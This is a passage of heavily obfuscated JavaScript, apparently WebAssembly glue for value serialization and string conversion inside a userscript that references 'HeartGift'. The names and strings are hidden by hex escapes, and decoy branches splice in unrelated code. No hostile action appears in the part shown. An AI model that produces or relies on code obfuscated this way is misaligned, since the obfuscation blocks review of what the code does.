_0x125046;}catch(_0x263e60){console['\x6c\x6f\x67'](_0x355350[_0x314c('262','\x62\x5e\x4a\x7a')],_0x263e60);}};continue;case'\x35':Object[_0x314c('263','\x30\x45\x2a\x43')](_0xf4dc8b,_0x386248['\x57\x5a\x41\x6e\x66'],{'\x76\x61\x6c\x75\x65':_0xf4dc8b['\x69\x6e\x73\x74\x61\x6e\x63\x65'][_0x314c('264','\x4a\x61\x48\x39')][_0x314c('265','\x41\x55\x44\x5a')]});continue;case'\x36':_0x386248[_0x314c('266','\x49\x64\x79\x5a')](_0x3220d6);continue;}break;}}else{_0x16b557[_0x314c('267','\x70\x48\x6e\x21')]=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x6e\x6f\x6f\x70'];_0x3fa88c=0x0;}}if(_0x43514a[_0x314c('268','\x4b\x74\x36\x4b')](_0x333f9a,0x0)){if(_0x43514a[_0x314c('269','\x49\x47\x28\x5d')](_0x43cd63,0xc)||_0x43514a['\x47\x47\x76\x56\x4c'](_0x43cd63,0xd)){throw new ReferenceError(_0x43514a['\x67\x75\x67\x53\x43']);}}var _0x590ecf=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('26a','\x35\x44\x32\x4f')](0x10);_0xf4dc8b[_0x314c('26b','\x50\x29\x62\x6b')][_0x314c('26c','\x58\x72\x51\x54')](_0x590ecf,arguments);try{_0x333f9a+=0x1;_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x64\x79\x6e\x63\x61\x6c\x6c'](_0x43514a[_0x314c('26d','\x30\x28\x5b\x6e')],_0x29d11c,[_0x3df5f0,_0x590ecf]);_0xf4dc8b[_0x314c('26e','\x43\x5e\x40\x53')]['\x74\x6d\x70']=null;var _0x55819a=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('26f','\x5e\x32\x37\x57')];}finally{if(_0x43514a[_0x314c('270','\x29\x70\x73\x69')](_0x43514a['\x65\x6a\x68\x4c\x43'],_0x43514a[_0x314c('271','\x4f\x4d\x34\x67')])){try{return{'\x76\x61\x6c\x75\x65':r[_0x314c('272','\x4a\x61\x48\x39')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x149fa7){return{'\x65\x72\x72\x6f\x72':_0x149fa7,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}else{_0x333f9a-=0x1;}}if(_0x43514a['\x70\x4d\x70\x4e\x6e'](_0x475b5b,!![])&&_0x43514a['\x4e\x78\x78\x6e\x7a'](_0x333f9a,0x0)){_0x16b557[_0x314c('273','\x30\x28\x5b\x6e')]();}return _0x55819a;};_0x16b557['\x64\x72\x6f\x70']=function(){var _0x23c2a6={'\x57\x47\x6a\x69\x44':function(_0x127673,_0x189118){return _0x43514a[_0x314c('274','\x50\x29\x62\x6b')](_0x127673,_0x189118);},'\x6e\x4c\x77\x6f\x4e':function(_0x441827,_0x28cd31){return _0x43514a[_0x314c('275','\x6d\x69\x5d\x58')](_0x441827,_0x28cd31);},'\x43\x58\x75\x77\x69':function(_0xb727bd,_0x221bb6){return _0x43514a['\x76\x71\x67\x7a\x6d'](_0xb727bd,_0x221bb6);},'\x52\x77\x4f\x76\x58':function(_0x4662f5,_0x5140ba){return _0x43514a[_0x314c('276','\x30\x44\x72\x77')](_0x4662f5,_0x5140ba);},'\x59\x69\x4f\x6f\x57':function(_0x5042ab,_0x361df5){return _0x43514a['\x4c\x54\x73\x43\x77'](_0x5042ab,_0x361df5);},'\x68\x67\x43\x55\x50':function(_0x21270c,_0x4c7fa4){return _0x43514a[_0x314c('274','\x50\x29\x62\x6b')](_0x21270c,_0x4c7fa4);}};if(_0x43514a[_0x314c('277','\x29\x70\x73\x69')](_0x333f9a,0x0)){_0x475b5b=!![];return;}_0x16b557[_0x314c('278','\x38\x78\x71\x41')]=_0xf4dc8b[_0x314c('279','\x33\x6a\x45\x23')]['\x6e\x6f\x6f\x70'];var _0x35bfe2=_0x3fa88c;_0x3fa88c=0x0;if(_0x43514a[_0x314c('27a','\x62\x5e\x4a\x7a')](_0x35bfe2,0x0)){if(_0x43514a[_0x314c('27b','\x29\x70\x73\x69')](_0x43514a[_0x314c('27c','\x4a\x61\x48\x39')],_0x43514a[_0x314c('27d','\x23\x61\x70\x4b')])){_0x3af0ed[addr++]=_0x23c2a6['\x57\x47\x6a\x69\x44'](0xe0,_0x23c2a6[_0x314c('27e','\x5e\x32\x37\x57')](u,0xc));_0x3af0ed[addr++]=_0x23c2a6[_0x314c('27f','\x4a\x66\x66\x48')](0x80,_0x23c2a6[_0x314c('280','\x5d\x31\x73\x72')](_0x23c2a6[_0x314c('281','\x29\x70\x73\x69')](u,0x6),0x3f));_0x3af0ed[addr++]=_0x23c2a6[_0x314c('282','\x62\x5e\x4a\x7a')](0x80,_0x23c2a6[_0x314c('283','\x5e\x32\x37\x57')](u,0x3f));}else{_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('284','\x46\x70\x7a\x61')]('\x76\x69',_0x24b949,[_0x35bfe2]);}}};return _0x16b557;}else if(_0x43514a[_0x314c('285','\x29\x70\x73\x69')](_0x43cd63,0xe)){var _0x5f594b=_0x43514a['\x62\x68\x78\x58\x52']['\x73\x70\x6c\x69\x74']('\x7c'),_0x1a5abe=0x0;while(!![]){switch(_0x5f594b[_0x1a5abe++]){case'\x30':switch(_0x1ded7f){case 0x0:return _0xf4dc8b[_0x314c('286','\x6a\x65\x59\x59')][_0x314c('287','\x40\x5b\x6f\x33')](_0x3fa88c,_0x8f2b70);case 0x1:return _0xf4dc8b[_0x314c('288','\x30\x28\x5b\x6e')][_0x314c('289','\x4a\x5a\x67\x35')](_0x3fa88c,_0x8f2b70);case 0x2:return _0xf4dc8b['\x48\x45\x41\x50\x55\x31\x36']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x3fa88c,_0x8f2b70);case 0x3:return _0xf4dc8b[_0x314c('28a','\x38\x78\x71\x41')][_0x314c('28b','\x4a\x61\x48\x39')](_0x3fa88c,_0x8f2b70);case 0x4:return _0xf4dc8b[_0x314c('21d','\x30\x28\x5b\x6e')][_0x314c('28c','\x4c\x47\x63\x30')](_0x3fa88c,_0x8f2b70);case 0x5:return _0xf4dc8b[_0x314c('28d','\x6c\x4f\x4b\x49')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x3fa88c,_0x8f2b70);case 0x6:return _0xf4dc8b['\x48\x45\x41\x50\x46\x33\x32']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x3fa88c,_0x8f2b70);case 0x7:return _0xf4dc8b[_0x314c('28e','\x54\x47\x31\x45')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x3fa88c,_0x8f2b70);}continue;case'\x31':var _0x443f65=_0xf4dc8b[_0x314c('28f','\x73\x6d\x59\x79')][_0x43514a['\x56\x50\x6b\x4e\x4d'](_0x43514a['\x6f\x65\x6e\x70\x4e'](_0x5d7d53,0x4),0x4)];continue;case'\x32':var _0x8f2b70=_0x43514a['\x6f\x65\x6e\x70\x4e'](_0x3fa88c,_0x443f65);continue;case'\x33':var _0x3fa88c=_0xf4dc8b[_0x314c('290','\x49\x47\x28\x5d')][_0x43514a[_0x314c('291','\x6c\x4f\x4b\x49')](_0x5d7d53,0x4)];continue;case'\x34':var _0x1ded7f=_0xf4dc8b[_0x314c('12f','\x30\x45\x2a\x43')][_0x43514a['\x56\x50\x6b\x4e\x4d'](_0x43514a[_0x314c('292','\x67\x35\x29\x58')](_0x5d7d53,0x8),0x4)];continue;}break;}}else if(_0x43514a[_0x314c('293','\x43\x5e\x40\x53')](_0x43cd63,0xf)){if(_0x43514a['\x49\x50\x41\x4a\x63'](_0x43514a[_0x314c('294','\x41\x55\x44\x5a')],_0x43514a['\x53\x54\x4c\x65\x45'])){return![];}else{return _0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x67\x65\x74\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0xf4dc8b[_0x314c('295','\x4b\x74\x36\x4b')][_0x43514a['\x74\x72\x51\x4d\x4b'](_0x5d7d53,0x4)]);}}}};_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('296','\x30\x45\x2a\x43')]=function serialize_object(_0x25209d,_0x48805c){var _0x37126c=Object[_0x314c('297','\x67\x35\x29\x58')](_0x48805c);var _0x2273b4=_0x37126c[_0x314c('298','\x30\x28\x5b\x6e')];var _0xbfdb1a=_0xf4dc8b[_0x314c('299','\x49\x64\x79\x5a')]['\x61\x6c\x6c\x6f\x63'](_0x43514a[_0x314c('233','\x23\x4b\x40\x64')](_0x2273b4,0x8));var _0x7a8d89=_0xf4dc8b[_0x314c('207','\x23\x7a\x39\x6a')][_0x314c('29a','\x4d\x68\x38\x36')](_0x43514a[_0x314c('29b','\x23\x7a\x76\x4e')](_0x2273b4,0x10));_0xf4dc8b[_0x314c('29c','\x4a\x61\x48\x39')][_0x43514a[_0x314c('29d','\x58\x72\x51\x54')](_0x25209d,0xc)]=0x8;_0xf4dc8b[_0x314c('29e','\x68\x53\x76\x4a')][_0x43514a['\x74\x72\x51\x4d\x4b'](_0x25209d,0x4)]=_0x7a8d89;_0xf4dc8b[_0x314c('29f','\x6a\x55\x53\x40')][_0x43514a[_0x314c('2a0','\x4a\x66\x66\x48')](_0x43514a['\x78\x46\x52\x51\x61'](_0x25209d,0x4),0x4)]=_0x2273b4;_0xf4dc8b[_0x314c('21d','\x30\x28\x5b\x6e')][_0x43514a['\x4e\x75\x63\x6f\x46'](_0x43514a[_0x314c('2a1','\x30\x28\x5b\x6e')](_0x25209d,0x8),0x4)]=_0xbfdb1a;for(var _0x5460f3=0x0;_0x43514a[_0x314c('2a2','\x30\x45\x2a\x43')](_0x5460f3,_0x2273b4);++_0x5460f3){if(_0x43514a['\x46\x71\x64\x41\x65'](_0x43514a[_0x314c('2a3','\x4a\x5a\x67\x35')],_0x43514a[_0x314c('2a4','\x30\x44\x72\x77')])){z=_0x3af0ed[index++];}else{var _0x471f4f=_0x37126c[_0x5460f3];var _0x12db9b=_0x43514a[_0x314c('2a5','\x73\x6d\x59\x79')](_0xbfdb1a,_0x43514a[_0x314c('2a6','\x66\x70\x46\x36')](_0x5460f3,0x8));_0xf4dc8b[_0x314c('220','\x5e\x32\x37\x57')][_0x314c('2a7','\x55\x25\x59\x55')](_0x12db9b,_0x471f4f);_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('2a8','\x4a\x63\x71\x4b')](_0x43514a[_0x314c('2a9','\x37\x41\x46\x30')](_0x7a8d89,_0x43514a[_0x314c('2aa','\x46\x70\x7a\x61')](_0x5460f3,0x10)),_0x48805c[_0x471f4f]);}}};_0xf4dc8b[_0x314c('2ab','\x4a\x61\x48\x39')]['\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x5f\x61\x72\x72\x61\x79']=function serialize_array(_0x55954e,_0x505e15){var _0x3b6873={'\x69\x55\x4b\x63\x44':function(_0x3ae14c,_0x561bb9){return _0x43514a[_0x314c('2ac','\x49\x47\x28\x5d')](_0x3ae14c,_0x561bb9);},'\x68\x71\x59\x44\x4c':function(_0x48ee8,_0x20503e){return _0x43514a[_0x314c('2ad','\x62\x5e\x4a\x7a')](_0x48ee8,_0x20503e);},'\x6e\x62\x6a\x66\x69':function(_0x42845e){return _0x43514a[_0x314c('2ae','\x5e\x32\x37\x57')](_0x42845e);},'\x63\x74\x63\x59\x70':function(_0x12af06,_0x11cd9d){return _0x43514a['\x74\x44\x73\x61\x69'](_0x12af06,_0x11cd9d);}};if(_0x43514a['\x46\x71\x64\x41\x65'](_0x43514a[_0x314c('2af','\x40\x5b\x6f\x33')],_0x43514a[_0x314c('2b0','\x39\x68\x72\x66')])){var _0x5c9387=_0x505e15['\x6c\x65\x6e\x67\x74\x68'];var _0x19ba3f=_0xf4dc8b[_0x314c('2b1','\x66\x70\x46\x36')][_0x314c('2b2','\x38\x78\x71\x41')](_0x43514a[_0x314c('2b3','\x37\x41\x46\x30')](_0x5c9387,0x10));_0xf4dc8b[_0x314c('2b4','\x40\x5b\x6f\x33')][_0x43514a['\x49\x4f\x58\x5a\x57'](_0x55954e,0xc)]=0x7;_0xf4dc8b['\x48\x45\x41\x50\x55\x33\x32'][_0x43514a[_0x314c('2b5','\x23\x7a\x39\x6a')](_0x55954e,0x4)]=_0x19ba3f;_0xf4dc8b[_0x314c('2b6','\x55\x25\x59\x55')][_0x43514a[_0x314c('2b7','\x4a\x61\x48\x39')](_0x43514a['\x49\x4f\x58\x5a\x57'](_0x55954e,0x4),0x4)]=_0x5c9387;for(var _0xf739d2=0x0;_0x43514a[_0x314c('2b8','\x70\x48\x6e\x21')](_0xf739d2,_0x5c9387);++_0xf739d2){if(_0x43514a[_0x314c('2b9','\x73\x6d\x59\x79')](_0x43514a[_0x314c('2ba','\x78\x44\x4a\x25')],_0x43514a[_0x314c('2bb','\x55\x25\x59\x55')])){var _0x530f71=_0xf4dc8b[_0x314c('2bc','\x6a\x65\x59\x59')][_0x314c('2bd','\x29\x70\x73\x69')](_0x505e15);_0xf4dc8b[_0x314c('2be','\x30\x69\x67\x5d')][_0x3b6873[_0x314c('2bf','\x23\x7a\x76\x4e')](_0x55954e,0xc)]=0x9;_0xf4dc8b[_0x314c('2c0','\x70\x48\x6e\x21')][_0x3b6873[_0x314c('2c1','\x68\x53\x76\x4a')](_0x55954e,0x4)]=_0x530f71;}else{_0xf4dc8b[_0x314c('f','\x35\x44\x32\x4f')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x43514a[_0x314c('2c2','\x4a\x5a\x67\x35')](_0x19ba3f,_0x43514a['\x47\x4c\x5a\x75\x53'](_0xf739d2,0x10)),_0x505e15[_0xf739d2]);}}}else{let _0x23f794=this[_0x314c('2c3','\x45\x61\x5e\x30')][_0x314c('2c4','\x6a\x55\x53\x40')]();if(_0x23f794){_0x3b6873['\x6e\x62\x6a\x66\x69'](_0x23f794);}if(_0x3b6873['\x63\x74\x63\x59\x70'](this[_0x314c('2c5','\x39\x68\x72\x66')][_0x314c('2c6','\x73\x6d\x59\x79')],0x0)){this['\x6c\x6f\x63\x6b\x65\x64']=![];}}};var _0xac0728=_0x43514a['\x7a\x46\x64\x6e\x66'](typeof TextEncoder,_0x43514a[_0x314c('2c7','\x4a\x63\x71\x4b')])?new TextEncoder(_0x43514a[_0x314c('2c8','\x78\x44\x4a\x25')]):_0x43514a['\x7a\x46\x64\x6e\x66'](typeof util,_0x43514a['\x67\x76\x52\x56\x65'])&&util&&_0x43514a[_0x314c('2c9','\x54\x47\x31\x45')](typeof util['\x54\x65\x78\x74\x45\x6e\x63\x6f\x64\x65\x72'],_0x43514a['\x54\x72\x71\x51\x6b'])?new util['\x54\x65\x78\x74\x45\x6e\x63\x6f\x64\x65\x72'](_0x43514a[_0x314c('2ca','\x43\x5e\x40\x53')]):null;if(_0x43514a[_0x314c('2cb','\x4f\x4d\x34\x67')](_0xac0728,null)){_0xf4dc8b[_0x314c('1f4','\x58\x72\x51\x54')]['\x74\x6f\x5f\x75\x74\x66\x38\x5f\x73\x74\x72\x69\x6e\x67']=function to_utf8_string(_0x53a3ca,_0x1cc8c7){var _0x3a914e=_0xac0728['\x65\x6e\x63\x6f\x64\x65'](_0x1cc8c7);var _0x350fc1=_0x3a914e['\x6c\x65\x6e\x67\x74\x68'];var _0x5e6dc9=0x0;if(_0x43514a[_0x314c('2cc','\x73\x6d\x59\x79')](_0x350fc1,0x0)){if(_0x43514a['\x46\x71\x64\x41\x65'](_0x43514a[_0x314c('2cd','\x67\x35\x29\x58')],_0x43514a['\x63\x59\x73\x52\x66'])){return{'\x76\x61\x6c\x75\x65':r[_0x314c('2ce','\x62\x5e\x4a\x7a')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}else{_0x5e6dc9=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('2cf','\x4c\x47\x63\x30')](_0x350fc1);_0xf4dc8b[_0x314c('2d0','\x54\x47\x31\x45')][_0x314c('2d1','\x49\x47\x28\x5d')](_0x3a914e,_0x5e6dc9);}}_0xf4dc8b['\x48\x45\x41\x50\x55\x33\x32'][_0x43514a['\x53\x62\x45\x46\x69'](_0x53a3ca,0x4)]=_0x5e6dc9;_0xf4dc8b[_0x314c('2d2','\x4d\x75\x32\x25')][_0x43514a['\x53\x62\x45\x46\x69'](_0x43514a[_0x314c('2d3','\x78\x44\x4a\x25')](_0x53a3ca,0x4),0x4)]=_0x350fc1;};}else{if(_0x43514a[_0x314c('2d4','\x67\x35\x29\x58')](_0x43514a[_0x314c('2d5','\x4a\x63\x71\x4b')],_0x43514a['\x69\x48\x56\x49\x48'])){_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x74\x6f\x5f\x75\x74\x66\x38\x5f\x73\x74\x72\x69\x6e\x67']=function to_utf8_string(_0x3427a7,_0x38a2e0){var _0x1f5182={'\x63\x5a\x63\x71\x65':function(_0x3d77b2,_0x36046c){return _0x43514a[_0x314c('2d6','\x23\x7a\x39\x6a')](_0x3d77b2,_0x36046c);}};var _0x4d1905=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('2d7','\x23\x7a\x39\x6a')](_0x38a2e0);var _0x4515d6=0x0;if(_0x43514a[_0x314c('2d8','\x40\x5b\x6f\x33')](_0x4d1905,0x0)){if(_0x43514a[_0x314c('2d9','\x41\x55\x44\x5a')](_0x43514a[_0x314c('2da','\x67\x35\x29\x58')],_0x43514a[_0x314c('2db','\x6d\x69\x5d\x58')])){_0x4515d6=_0xf4dc8b[_0x314c('2dc','\x29\x70\x73\x69')][_0x314c('2dd','\x4a\x63\x71\x4b')](_0x4d1905);_0xf4dc8b[_0x314c('2de','\x4a\x63\x71\x4b')]['\x74\x6f\x5f\x75\x74\x66\x38'](_0x38a2e0,_0x4515d6);}else{if(HeartGift[_0x314c('2df','\x66\x70\x46\x36')]){console[_0x314c('2e0','\x77\x7a\x70\x4e')](_0x314c('2e1','\x4a\x63\x71\x4b'));HeartGift[_0x314c('106','\x70\x48\x6e\x21')]=![];_0x1f5182[_0x314c('2e2','\x30\x69\x67\x5d')](runTomorrow,HeartGift['\x72\x75\x6e']);}}}_0xf4dc8b['\x48\x45\x41\x50\x55\x33\x32'][_0x43514a[_0x314c('2e3','\x77\x7a\x70\x4e')](_0x3427a7,0x4)]=_0x4515d6;_0xf4dc8b['\x48\x45\x41\x50\x55\x33\x32'][_0x43514a[_0x314c('2e4','\x68\x53\x76\x4a')](_0x43514a['\x65\x67\x67\x61\x69'](_0x3427a7,0x4),0x4)]=_0x4d1905;};}else{throw new ReferenceError(_0x43514a['\x79\x79\x76\x65\x67']);}}_0xf4dc8b[_0x314c('230','\x6d\x69\x5d\x58')]['\x66\x72\x6f\x6d\x5f\x6a\x73']=function from_js(_0x549cf5,_0xcf4e7b){var _0x20efd7=Object['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x314c('2e5','\x64\x75\x43\x75')][_0x314c('2e6','\x37\x41\x46\x30')](_0xcf4e7b);if(_0x43514a[_0x314c('2e7','\x45\x61\x5e\x30')](_0x20efd7,_0x43514a[_0x314c('2e8','\x6d\x69\x5d\x58')])){_0xf4dc8b[_0x314c('2e9','\x4a\x5a\x67\x35')][_0x43514a['\x65\x69\x49\x4a\x66'](_0x549cf5,0xc)]=0x4;_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('2ea','\x4d\x75\x32\x25')](_0x549cf5,_0xcf4e7b);}else if(_0x43514a[_0x314c('2eb','\x23\x4b\x40\x64')](_0x20efd7,_0x43514a[_0x314c('2ec','\x29\x70\x73\x69')])){if(_0x43514a['\x66\x78\x44\x73\x61'](_0xcf4e7b,_0x43514a[_0x314c('2ed','\x45\x61\x5e\x30')](_0xcf4e7b,0x0))){_0xf4dc8b['\x48\x45\x41\x50\x55\x38'][_0x43514a[_0x314c('2ee','\x64\x75\x43\x75')](_0x549cf5,0xc)]=0x2;_0xf4dc8b['\x48\x45\x41\x50\x33\x32'][_0x43514a[_0x314c('2ef','\x4d\x75\x32\x25')](_0x549cf5,0x4)]=_0xcf4e7b;}else{if(_0x43514a[_0x314c('2f0','\x37\x41\x46\x30')](_0x43514a[_0x314c('2f1','\x30\x45\x2a\x43')],_0x43514a['\x76\x4c\x4b\x62\x58'])){_0xf4dc8b[_0x314c('2f2','\x30\x44\x72\x77')][_0x43514a[_0x314c('2f3','\x77\x7a\x70\x4e')](_0x549cf5,0xc)]=0x3;_0xf4dc8b['\x48\x45\x41\x50\x46\x36\x34'][_0x43514a[_0x314c('2f4','\x44\x41\x42\x61')](_0x549cf5,0x8)]=_0xcf4e7b;}else{return t[_0x314c('2f5','\x23\x61\x70\x4b')]();}}}else if(_0x43514a[_0x314c('2f6','\x45\x61\x5e\x30')](_0xcf4e7b,null)){_0xf4dc8b[_0x314c('2be','\x30\x69\x67\x5d')][_0x43514a[_0x314c('2f3','\x77\x7a\x70\x4e')](_0x549cf5,0xc)]=0x1;}else if(_0x43514a[_0x314c('2f7','\x4a\x61\x48\x39')](_0xcf4e7b,undefined)){_0xf4dc8b[_0x314c('2f8','\x66\x70\x46\x36')][_0x43514a[_0x314c('2f9','\x4a\x61\x48\x39')](_0x549cf5,0xc)]=0x0;}else if(_0x43514a[_0x314c('2fa','\x30\x69\x67\x5d')](_0xcf4e7b,![])){if(_0x43514a[_0x314c('2fb','\x4b\x74\x36\x4b')](_0x43514a[_0x314c('2fc','\x33\x6a\x45\x23')],_0x43514a[_0x314c('2fd','\x4a\x5a\x67\x35')])){_0x184f6d=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x6c\x61\x73\x74\x5f\x72\x65\x66\x69\x64']++;try{ref_to_id_map['\x73\x65\x74'](reference,_0x184f6d);}catch(_0x5edba4){ref_to_id_map_fallback[_0x314c('2fe','\x40\x5b\x6f\x33')](reference,_0x184f6d);}}else{_0xf4dc8b[_0x314c('2be','\x30\x69\x67\x5d')][_0x43514a['\x67\x6a\x78\x51\x56'](_0x549cf5,0xc)]=0x5;}}else if(_0x43514a['\x69\x64\x56\x4a\x61'](_0xcf4e7b,!![])){_0xf4dc8b[_0x314c('2ff','\x46\x70\x7a\x61')][_0x43514a['\x70\x45\x73\x52\x59'](_0x549cf5,0xc)]=0x6;}else if(_0x43514a[_0x314c('300','\x30\x45\x2a\x43')](_0x20efd7,_0x43514a['\x4f\x66\x50\x66\x57'])){var _0x48563a=_0xf4dc8b[_0x314c('1f4','\x58\x72\x51\x54')]['\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0xcf4e7b);_0xf4dc8b[_0x314c('301','\x77\x7a\x70\x4e')][_0x43514a['\x77\x73\x4f\x4c\x5a'](_0x549cf5,0xc)]=0xf;_0xf4dc8b['\x48\x45\x41\x50\x33\x32'][_0x43514a[_0x314c('302','\x23\x61\x70\x4b')](_0x549cf5,0x4)]=_0x48563a;}else{var _0x184f6d=_0xf4dc8b[_0x314c('303','\x38\x78\x71\x41')][_0x314c('304','\x62\x5e\x4a\x7a')](_0xcf4e7b);_0xf4dc8b[_0x314c('305','\x30\x45\x2a\x43')][_0x43514a[_0x314c('306','\x23\x61\x70\x4b')](_0x549cf5,0xc)]=0x9;_0xf4dc8b['\x48\x45\x41\x50\x33\x32'][_0x43514a[_0x314c('307','\x78\x44\x4a\x25')](_0x549cf5,0x4)]=_0x184f6d;}};var _0x11b85c=_0x43514a[_0x314c('308','\x64\x75\x43\x75')](typeof TextDecoder,_0x43514a[_0x314c('309','\x4a\x61\x48\x39')])?new TextDecoder(_0x43514a[_0x314c('30a','\x23\x7a\x39\x6a')]):_0x43514a[_0x314c('30b','\x5d\x31\x73\x72')](typeof util,_0x43514a[_0x314c('30c','\x35\x44\x32\x4f')])&&util&&_0x43514a[_0x314c('30d','\x40\x5b\x6f\x33')](typeof util[_0x314c('30e','\x43\x5e\x40\x53')],_0x43514a[_0x314c('30f','\x4a\x5a\x67\x35')])?new util[(_0x314c('310','\x29\x70\x73\x69'))](_0x43514a['\x58\x66\x48\x56\x77']):null;if(_0x43514a[_0x314c('311','\x30\x69\x67\x5d')](_0x11b85c,null)){if(_0x43514a['\x6b\x6f\x62\x43\x5a'](_0x43514a[_0x314c('312','\x46\x70\x7a\x61')],_0x43514a['\x4b\x79\x53\x50\x63'])){_0xf4dc8b[_0x314c('313','\x68\x53\x76\x4a')]['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67']=function to_js_string(_0x4499c1,_0x480c72){return _0x11b85c['\x64\x65\x63\x6f\x64\x65'](_0xf4dc8b['\x48\x45\x41\x50\x55\x38']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4499c1,_0x43514a[_0x314c('314','\x29\x70\x73\x69')](_0x4499c1,_0x480c72)));};}else{u=_0x43514a[_0x314c('315','\x4d\x75\x32\x25')](_0x43514a['\x49\x4c\x6f\x66\x6f'](0x10000,_0x43514a[_0x314c('316','\x78\x44\x4a\x25')](_0x43514a[_0x314c('317','\x6c\x4f\x4b\x49')](u,0x3ff),0xa)),_0x43514a[_0x314c('318','\x4a\x66\x66\x48')](str[_0x314c('319','\x49\x64\x79\x5a')](++i),0x3ff));}}else{_0xf4dc8b[_0x314c('31a','\x4d\x68\x38\x36')][_0x314c('31b','\x23\x7a\x39\x6a')]=function to_js_string(_0x29fb22,_0x2e5ee6){var _0x1abdf1=_0x43514a['\x46\x46\x41\x4e\x57'][_0x314c('124','\x49\x47\x28\x5d')]('\x7c'),_0x5844c9=0x0;while(!![]){switch(_0x1abdf1[_0x5844c9++]){case'\x30':_0x2e5ee6=_0x43514a[_0x314c('31c','\x4a\x63\x71\x4b')](_0x2e5ee6,0x0);continue;case'\x31':var _0x1ab5e9=_0xf4dc8b[_0x314c('31d','\x6c\x4f\x4b\x49')];continue;case'\x32':while(_0x43514a[_0x314c('31e','\x23\x7a\x76\x4e')](_0x29fb22,_0x5f7605)){var _0x1e8b64=_0x1ab5e9[_0x29fb22++];if(_0x43514a['\x6b\x58\x66\x4f\x44'](_0x1e8b64,0x80)){if(_0x43514a['\x46\x42\x6a\x79\x64'](_0x43514a[_0x314c('31f','\x6c\x4f\x4b\x49')],_0x43514a[_0x314c('320','\x77\x7a\x70\x4e')])){_0xf4dc8b[_0x314c('2be','\x30\x69\x67\x5d')][_0x4c67c1[_0x314c('321','\x4c\x47\x63\x30')](address,0xc)]=0x0;}else{_0x4cd3aa+=String[_0x314c('322','\x29\x70\x73\x69')](_0x1e8b64);continue;}}var _0x2ba612=_0x43514a['\x47\x72\x66\x62\x4b'](_0x1e8b64,_0x43514a['\x6c\x76\x49\x53\x68'](0x7f,0x2));var _0x2e1dcf=0x0;if(_0x43514a['\x58\x62\x6d\x50\x6a'](_0x29fb22,_0x5f7605)){_0x2e1dcf=_0x1ab5e9[_0x29fb22++];}var _0x4254d7=_0x43514a[_0x314c('323','\x39\x68\x72\x66')](_0x43514a['\x4e\x6f\x42\x7a\x43'](_0x2ba612,0x6),_0x43514a[_0x314c('324','\x77\x7a\x70\x4e')](_0x2e1dcf,0x3f));if(_0x43514a['\x71\x6e\x70\x41\x63'](_0x1e8b64,0xe0)){if(_0x43514a[_0x314c('325','\x78\x44\x4a\x25')](_0x43514a[_0x314c('326','\x4a\x63\x71\x4b')],_0x43514a[_0x314c('327','\x6d\x69\x5d\x58')])){id_to_ref_map[refid]=reference;id_to_refcount_map[refid]=0x1;}else{var _0x57e7e0=0x0;if(_0x43514a[_0x314c('328','\x73\x6d\x59\x79')](_0x29fb22,_0x5f7605)){if(_0x43514a[_0x314c('329','\x55\x25\x59\x55')](_0x43514a[_0x314c('32a','\x49\x47\x28\x5d')],_0x43514a['\x77\x51\x53\x5a\x44'])){try{return{'\x76\x61\x6c\x75\x65':r['\x68\x72\x65\x66'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x2fb766){return{'\x65\x72\x72\x6f\x72':_0x2fb766,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}else{_0x57e7e0=_0x1ab5e9[_0x29fb22++];}}var _0x3291a0=_0x43514a['\x4b\x4e\x56\x4c\x73'](_0x43514a['\x4e\x6f\x42\x7a\x43'](_0x43514a[_0x314c('32b','\x73\x6d\x59\x79')](_0x2e1dcf,0x3f),0x6),_0x43514a['\x54\x6e\x41\x68\x70'](_0x57e7e0,0x3f));_0x4254d7=_0x43514a[_0x314c('32c','\x55\x25\x59\x55')](_0x43514a[_0x314c('32d','\x41\x55\x44\x5a')](_0x2ba612,0xc),_0x3291a0);if(_0x43514a['\x4b\x50\x6c\x4b\x6b'](_0x1e8b64,0xf0)){var _0x19e32a=0x0;if(_0x43514a['\x58\x62\x6d\x50\x6a'](_0x29fb22,_0x5f7605)){if(_0x43514a[_0x314c('32e','\x23\x7a\x76\x4e')](_0x43514a[_0x314c('32f','\x4a\x61\x48\x39')],_0x43514a['\x62\x4d\x43\x44\x56'])){_0x19e32a=_0x1ab5e9[_0x29fb22++];}else{var 